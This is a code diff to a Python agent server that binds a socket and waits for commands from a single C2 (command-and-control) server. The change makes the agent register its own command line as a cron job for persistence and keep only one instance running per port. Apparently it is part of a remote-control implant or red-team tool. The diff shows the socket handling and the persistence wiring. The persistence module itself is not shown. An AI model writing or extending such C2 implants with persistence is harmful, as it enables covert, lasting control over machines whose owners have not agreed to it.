@@ -6,7 +6,8 @@ sys.path.append(os.path.dirname(os.path.abspath(__file__)) + '/../')
 
 from protocol import validator
 from agent.agent_connection_handler import ConnectionHandler
-from agent.persistency import cronjob_creator
+# from agent.persistency import cronjob_creator
+import persistency
 import socket
 import argparse
 import uuid
@@ -49,6 +50,15 @@ def generate_agent_uuid():
     return agent_uuid
 
 
+def get_cmdline():
+    # Get the full command line by combining executable with script args
+    script_path = os.path.abspath(sys.argv[0])
+    args = sys.argv[1:]
+    cmdline = [sys.executable, script_path] + args
+    return ' '.join(cmdline)
+
+
+
 class ThreadedServer:
     def __init__(self, src_ip, src_port):
         self.agent_uuid = generate_agent_uuid()
@@ -66,11 +76,18 @@ class ThreadedServer:
 
     # todo: #to-fill
     def start(self):
+        persistency.create_cron(get_cmdline())  # register the server in cron job
+        if persistency.is_server_running(self.src_port):  # checking if the listening port is already used, keeping only single instance of the agen't server per port
+            print(f"[+] Agent server already running on port {self.src_port}. Exiting")
+            return
+
+        print(f"[+] Agent server isn't running. Starting agent's server...")
         print(f"[+] Trying to bind {self.src_ip}:{self.src_port}")
         self.server_socket.bind((self.src_ip, self.src_port))
         print(f"[+] Server listening on {self.src_ip}:{self.src_port}")
         self.server_socket.listen(1)  # we expect to receive commands from only one connecting C2 server
-        cronjob_creator.create(self.src_port) # register the server in cron job
+
+        # cronjob_creator.create(self.src_port) # register the server in cron job
 
         print(f"[+] Waiting for incoming connections")
         try:
@@ -93,12 +110,12 @@ class ThreadedServer:
             handler.stop()
         self.server_socket.close()
 
-def main(src_ip, src_port):
+def main():
+    src_ip, src_port = parse_arguments()
     print("[+] Agent server starting")
     ThreadedServer(src_ip, src_port).start()
 
 
 
 if __name__ == "__main__":
-    src_ip, src_port = parse_arguments()
-    main(src_ip, src_port)
+    main()
